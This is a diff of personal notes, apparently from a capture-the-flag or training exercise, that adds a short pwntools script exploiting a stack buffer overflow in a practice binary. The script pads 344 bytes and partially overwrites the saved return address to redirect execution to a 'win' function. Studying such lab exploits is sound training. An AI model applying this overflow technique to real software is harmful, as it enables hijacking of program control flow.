@@ -154,3 +154,18 @@ cyclic saved rip = 0x6461616d6461616c (344)
 
 win+10 = 0x5595a06652fa
 
+of5.py
+/challenge/stackoverflow_level5 < level
+```
+import pwn
+
+pwn.context.terminal = ["tmux","splitw","-h"]
+#proc = pwn.gdb.debug("/challenge/stackoverflow_level5")
+#proc.send(pwn.cyclic(560))
+
+level = (b'A' *344 + b'\x1e\x13') #pwn.p8(0x08) + pwn.p8(c)) #344
+with open('level','wb') as f:
+    f.write(level)
+
+#proc.wait()
+```
